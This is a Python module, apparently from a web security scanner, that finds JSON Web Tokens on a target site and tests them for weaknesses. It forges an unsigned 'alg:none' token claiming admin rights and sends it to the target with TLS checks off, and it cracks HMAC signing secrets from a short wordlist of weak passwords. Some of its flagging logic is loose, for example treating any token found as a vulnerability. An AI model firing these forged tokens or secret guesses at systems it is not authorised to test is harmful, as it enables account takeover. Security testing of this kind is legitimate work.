import re, json, base64, time as _time
from typing import Optional, Dict
import requests

from tools.log_utils import get_logger

logger = get_logger("jwt_detector")

JWT_REGEX = r'[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+'

JWT_HEADER_KEYS = ["authorization", "x-jwt", "x-auth-token", "token", "bearer"]


def _b64_pad(s: str) -> str:
    return s + "=" * ((4 - len(s) % 4) % 4)


def decode_jwt_payload(token: str) -> Optional[Dict]:
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        padded = _b64_pad(parts[1])
        decoded = base64.urlsafe_b64decode(padded).decode("utf-8")
        return json.loads(decoded)
    except Exception:
        return None


def decode_jwt_header(token: str) -> Optional[Dict]:
    try:
        parts = token.split(".")
        padded = _b64_pad(parts[0])
        decoded = base64.urlsafe_b64decode(padded).decode("utf-8")
        return json.loads(decoded)
    except Exception:
        return None


def check_jwt_none(sess: requests.Session, url: str = None,
                   token_header: str = None) -> Dict:
    result = {"vulnerable": False, "type": None, "evidence": []}
    header = {"alg": "none", "typ": "JWT"}
    payload = {"sub": "admin", "role": "admin", "iat": _time.time()}
    hdr_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
    pld_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
    token = "%s.%s." % (hdr_b64, pld_b64)

    if url and sess:
        try:
            r = sess.get(url,
                         headers={"Authorization": "Bearer %s" % token},
                         timeout=10, verify=False)
            if r.status_code in (200, 201, 204):
                result["vulnerable"] = True
                result["type"] = "alg_none"
                result["evidence"].append("alg:none token accepted at %s (status %d)" % (url, r.status_code))
                return result
        except Exception as e:
            logger.debug("jwt none test: %s", e)

    return {"token": token, "header": header, "payload": payload,
            "note": "alg:none token generated - test manually if network test failed"}


def check_jwt_weak_secret(token: str, wordlist: list = None) -> Dict:
    if wordlist is None:
        wordlist = ["secret", "password", "123456", "admin", "key", "jwt_secret",
                     "supersecret", "pass", "changeme", "1234"]
    result = {"vulnerable": False, "found_secret": None}
    try:
        import hmac, hashlib
        parts = token.split(".")
        if len(parts) != 3:
            return result
        message = ("%s.%s" % (parts[0], parts[1])).encode()
        sig_b64 = _b64_pad(parts[2])
        target_sig = base64.urlsafe_b64decode(sig_b64)
        for secret in wordlist:
            expected = hmac.new(secret.encode(), message, hashlib.sha256).digest()
            if hmac.compare_digest(expected, target_sig):
                result["vulnerable"] = True
                result["found_secret"] = secret
                break
    except Exception:
        pass
    return result


def check(url: str, param: str = None, sess: Optional[requests.Session] = None,
          timeout: float = 10.0) -> Dict:
    if sess is None:
        sess = requests.Session()
    result = {"vulnerable": False, "tokens_found": [], "findings": []}

    if url:
        try:
            r = sess.get(url, timeout=timeout, verify=False)
            for m in re.finditer(JWT_REGEX, r.text):
                token = m.group(0)
                if len(token.split(".")) == 3:
                    payload = decode_jwt_payload(token)
                    hdr = decode_jwt_header(token)
                    entry = {"token": token[:50] + "...", "header": hdr, "payload": payload}
                    result["tokens_found"].append(entry)
                    if payload:
                        if payload.get("role") == "admin" or str(payload.get("sub", "")).startswith("admin"):
                            result["findings"].append("high-privilege token found in page body")
                        if hdr and hdr.get("alg") == "none":
                            result["findings"].append("alg:none token header detected in page body")
                        ws = check_jwt_weak_secret(token)
                        if ws["vulnerable"]:
                            result["findings"].append("weak secret: %s" % ws["found_secret"])

            for key, value in r.headers.items():
                lower_key = key.lower()
                if lower_key in JWT_HEADER_KEYS:
                    for m in re.finditer(JWT_REGEX, value):
                        token = m.group(0)
                        if len(token.split(".")) == 3:
                            entry = {"token": token[:50] + "...", "source": "header_%s" % key}
                            result["tokens_found"].append(entry)
                            result["findings"].append("jwt token found in header %s" % key)
                            break

                if lower_key == "set-cookie":
                    for m in re.finditer(JWT_REGEX, value):
                        token = m.group(0)
                        if len(token.split(".")) == 3:
                            entry = {"token": token[:50] + "...", "source": "set-cookie"}
                            result["tokens_found"].append(entry)
                            result["findings"].append("jwt token found in Set-Cookie header")
                            break
        except Exception as e:
            logger.debug("jwt scan: %s", e)

    if result["tokens_found"] or result["findings"]:
        result["vulnerable"] = True

    none_result = check_jwt_none(sess, url)
    if none_result.get("vulnerable"):
        result["vulnerable"] = True
        result["findings"].extend(none_result.get("evidence", []))
    result["alg_none_test"] = none_result

    if not result.get("tokens_found") and not result.get("findings"):
        try:
            for key in JWT_HEADER_KEYS:
                val = r.headers.get(key, "")
                if val and len(val) > 20 and "." in val:
                    logger.debug("potential JWT in header %s: %s...", key, val[:30])
        except Exception:
            pass

    return result
